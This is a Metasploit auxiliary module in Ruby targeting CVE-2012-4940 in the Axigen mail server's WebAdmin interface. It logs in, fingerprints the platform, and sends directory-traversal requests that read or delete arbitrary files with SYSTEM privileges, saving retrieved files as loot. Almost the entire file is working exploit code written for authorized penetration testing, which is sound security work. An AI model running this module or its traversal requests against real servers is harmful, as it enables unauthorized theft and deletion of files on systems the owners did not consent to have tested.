##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Axigen Arbitrary File Read and Delete',
      'Description' => %q{
          This module exploits a directory traversal vulnerability in the WebAdmin
        interface of Axigen, which allows an authenticated user to read and delete
        arbitrary files with SYSTEM privileges. The vulnerability is known to work on
        Windows platforms. This module has been tested successfully on Axigen 8.10 over
        Windows 2003 SP2.
      },
      'Author'       =>
        [
          'Zhao Liang', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'US-CERT-VU', '586556' ],
          [ 'CVE', '2012-4940' ],
          [ 'OSVDB', '86802' ]
        ],
      'Actions'     =>
        [
          ['Read',   { 'Description' => 'Read remote file' }],
          ['Delete', { 'Description' => 'Delete remote file' }]
        ],
      'DefaultAction' => 'Read',
      'DisclosureDate' => 'Oct 31 2012'))

    register_options(
      [
        Opt::RPORT(9000),
        OptInt.new('DEPTH',       [ true, 'Traversal depth if absolute is set to false', 4 ]),
        OptString.new('TARGETURI',[ true, 'Path to Axigen WebAdmin', '/' ]),
        OptString.new('USERNAME', [ true, 'The user to authenticate as', 'admin' ]),
        OptString.new('PASSWORD', [ true, 'The password to authenticate with' ]),
        OptString.new('PATH',     [ true, 'The file to read or delete', "\\windows\\win.ini" ])
      ])
  end

  def run
    print_status("Trying to login")
    if login
      print_good("Login Successful")
    else
      print_error("Login failed, review USERNAME and PASSWORD options")
      return
    end

    @traversal = "../" * 10
    file = datastore['PATH']
    @platform = get_platform

    if @platform == 'windows'
      @traversal.gsub!(/\//, "\\")
      file.gsub!(/\//, "\\")
    else # unix
      print_error("*nix platform detected, vulnerability is only known to work on Windows")
      return
    end

    case action.name
      when 'Read'
        read_file(datastore['PATH'])
      when 'Delete'
        delete_file(datastore['PATH'])
    end
  end

  def read_file(file)

    print_status("Retrieving file contents...")

    res = send_request_cgi(
    {
      'uri'           => normalize_uri(target_uri.path, "sources", "logging", "page_log_file_content.hsp"),
      'method'        => 'GET',
      'cookie'        => "_hadmin=#{@session}",
      'vars_get'     => {
        '_h' => @token,
        'fileName' => "#{@traversal}#{file}"
      }
    })

    if res and res.code == 200 and res.headers['Content-Type'] and res.body.length > 0
      store_path = store_loot("axigen.webadmin.data", "application/octet-stream", rhost, res.body, file)
      print_good("File successfully retrieved and saved on #{store_path}")
    else
      print_error("Failed to retrieve file")
    end
  end

  def delete_file(file)
    print_status("Deleting file #{file}")

    res = send_request_cgi(
    {
      'uri'           => normalize_uri(target_uri.path),
      'method'        => 'GET',
      'cookie'        => "_hadmin=#{@session}",
      'vars_get'     => {
        '_h' => @token,
        'page' => 'vlf',
        'action' => 'delete',
        'fileName' => "#{@traversal}#{file}"
      }
    })

    if res and res.code == 200 and res.body =~ /View Log Files/
      print_good("File #{file} deleted")
    else
      print_error("Error deleting file #{file}")
    end
  end

  def get_platform
    print_status("Retrieving platform")

    res = send_request_cgi(
      {
        'uri'           => normalize_uri(target_uri.path),
        'method'        => 'GET',
        'cookie'        => "_hadmin=#{@session}",
        'vars_get'     => {
          '_h' => @token
        }
      })

    if res and res.code == 200
      if res.body =~ /Windows/
        print_good("Windows platform found")
        return 'windows'
      elsif res.body =~ /Linux/
        print_good("Linux platform found")
        return 'unix'
      end
    end

    print_warning("Platform not found, assuming UNIX flavor")
    return 'unix'
  end

  def login
    res = send_request_cgi(
    {
      'uri'       => normalize_uri(target_uri.path),
      'method'    => 'POST',
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'submit'   => 'Login',
        'action'   => 'login'
      }
    })

    if res and res.code == 303 and res.headers['Location'] =~ /_h=([a-f0-9]*)/
      @token = $1
      if res.get_cookies =~ /_hadmin=([a-f0-9]*)/
        @session = $1
        return true
      end
    end

    return false
  end
end
